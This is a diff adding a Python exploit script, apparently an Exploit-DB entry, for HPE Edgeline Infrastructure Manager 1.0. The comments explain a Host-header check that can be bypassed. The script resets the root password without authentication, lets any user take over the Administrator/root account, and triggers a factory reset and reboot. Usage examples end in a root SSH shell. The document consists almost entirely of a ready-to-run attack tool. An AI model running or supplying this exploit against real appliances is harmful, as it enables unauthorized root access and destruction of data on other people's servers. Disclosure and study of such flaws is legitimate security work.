@@ -1,0 +1,218 @@
+# Exploit Title: HPE Edgeline Infrastructure Manager 1.0 - Multiple Remote Vulnerabilities
+# Date: 12-28-2020
+# Exploit Author: Jeremy Brown
+# Vendor Homepage: https://support.hpe.com/hpsc/swd/public/detail?swItemId=MTX_f62aaafe780a496dad6d28621a
+# Software Link: https://support.hpe.com/hpsc/swd/public/detail?swItemId=MTX_f62aaafe780a496dad6d28621a
+# Version: 1.0
+
+#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+#
+# billhader.py
+#
+# HPE Edgeline Infrastructure Manager Multiple Remote Vulnerabilities
+#
+# Jeremy Brown [jbrown3264/gmail]
+# Dec 2020
+#
+# In \opt\hpe\eim\containers\api\eim\api\urls.py, some private paths are defined
+# which are intended to only be accessible via the local console.
+#
+#    path('private/AdminPassReset', views.admin_password_reset), <-- ice
+#    path('private/ResetAppliance', views.reset_appliance), <-- ice
+#    path('private/EIMApplianceIP', views.get_eim_appliance_ips), <-- boring
+#
+# These are meant to only be exposed for the local GUI so admins can perform
+# functions without authenticating. The way do they do this is by checking the
+# Host header and returning a 404 not found for not-localhost, but 200 OK for
+# 127.0.0.1. This is of course flawed because any remote user has control over
+# the Host header and they can call these functions with valid JSON, eg.
+# /private/AdminPassReset to reset the admin password and login via SSH (default)
+# as root due to the Administrator and root always synced to the same password.
+# They can also call ResetAppliance and the appliance will immediately reset
+# user data and cause the entire server to reboot.
+#
+# Administrator is the default and permanent web console user and as mentioned it's
+# tied to the root OS user account. When Administrator changes their password, the
+# backend changes the root password to the same. Other users can be added to the
+# web console, but there is nothing stopping them changing any other user’s password.
+# Not even sure if this is a bug or just wow functionality because although the
+# users appear different, they all seem to share the same role. Broken or incomplete
+# design I guess. So any user can change the Administrator password and use it to
+# login as root via the default open SSH server, start setting up camp, etc.
+#
+# Usage examples
+# > billhader.py 10.0.0.10 pre_root_passwd -n letmein
+# {"RootPasswd": "Modified", "UserPassword": "Modified"}
+#
+# > ssh root@10.0.0.10
+# root@10.10.10.20's password: [letmein]
+# [root@hpe-eim ~]#
+#
+# > billhader.py 10.0.0.10 post_root_passwd -u test -p abc123
+# login succeeded
+# {"Status": "success", "Valid_Entries": ["Password"], "Invalid_Entries": []}
+#
+# (root password is now newpassword default of 'letmein')
+#
+# > billhader.py 10.10.10.20 pre_factory_reset
+# Lost your password huh? Are you sure you want to factory reset this server?
+# yes
+# done
+#
+
+import os
+import sys
+import argparse
+import requests
+import urllib.parse
+import json
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+BINGO = '127.0.0.1' # not localhost :')
+DEFAULT_PORT = 443
+
+class BillHader(object):
+	def __init__(self, args):
+		self.target = args.target
+		self.action = args.action
+		self.newpassword = args.newpassword
+		self.username = args.username
+		self.password = args.password
+
+	def run(self):
+		target = "https://" + self.target + ':' + str(DEFAULT_PORT)
+
+		session = requests.Session()
+		session.verify = False
+
+		if(self.action == 'pre_root_passwd'):
+			headers = {'Host':BINGO}
+
+			data = \
+			{'Password':self.newpassword,
+			'ConfirmPassword':self.newpassword}
+
+			try:
+				resp = session.post(target + "/private/AdminPassReset",
+					headers=headers,
+					data=json.dumps(data))
+			except Exception as error:
+				print("Error: %s" % error)
+				return -1
+
+			print("%s" % resp.text)
+
+		if(self.action == 'post_root_passwd'):
+			data = \
+			{'UserName':self.username,
+			'Password':self.password}
+
+			try:
+				resp = session.post(target + "/redfish/v1/SessionService/Sessions",
+					data=json.dumps(data))
+			except Exception as error:
+				print("Error: %s" % error)
+				return -1
+
+			if(resp.status_code != 201):
+				print("login failed")
+				return -1
+			else:
+				print("login succeeded")
+
+			try:
+				token = resp.headers['x-auth-token']
+			except:
+				print("Error: couldn't parse token from response header")
+				return -1
+
+			if(token == None):
+				print("Error: couldn't parse token from session")
+				return -1
+
+			headers = {'X-Auth-Token':token}
+
+			data = {'Password':self.newpassword}
+
+			try:
+				resp = session.patch(target + "/redfish/v1/AccountService/Accounts/1",
+					headers=headers,
+					data=json.dumps(data))
+			except Exception as error:
+				print("Error: %s" % error)
+				return -1
+
+			print("%s" % resp.text)
+
+		if(self.action == 'pre_factory_reset'):
+			print("Lost your password huh? Are you sure you want to factory reset this server?")
+
+			choice = input().lower()
+
+			if('yes' not in choice):
+				print("cool, exiting")
+				return -1
+
+			headers = {'Host':BINGO}
+
+			data = {'ResetRequired':'true'}
+
+			try:
+				resp = session.post(target + "/private/ResetAppliance", \
+					headers=headers,
+					data=json.dumps(data))
+			except Exception as error:
+				print("Error: %s" % error)
+				return -1
+
+			print("done")
+
+		return 0
+
+def arg_parse():
+	parser = argparse.ArgumentParser()
+
+	parser.add_argument("target",
+						type=str,
+						help="EIM host")
+
+	parser.add_argument("action",
+						type=str,
+						choices=['pre_root_passwd', 'post_root_passwd', 'pre_factory_reset'],
+						help="Which action to perform on the server")
+
+	parser.add_argument("-n",
+						"--newpassword",
+						type=str,
+						default="letmein",
+						help="New password to set for root account (letmein)")
+
+	parser.add_argument("-u",
+						"--username",
+						type=str,
+						help="Valid username (for post_root_reset)")
+
+	parser.add_argument("-p",
+						"--password",
+						type=str,
+						help="Valid password (for post_root_reset)")
+
+	args = parser.parse_args()
+
+	return args
+
+def main():
+	args = arg_parse()
+
+	bill = BillHader(args)
+
+	result = bill.run()
+
+	if(result > 0):
+		sys.exit(-1)
+
+if(__name__ == '__main__'):
+	main()
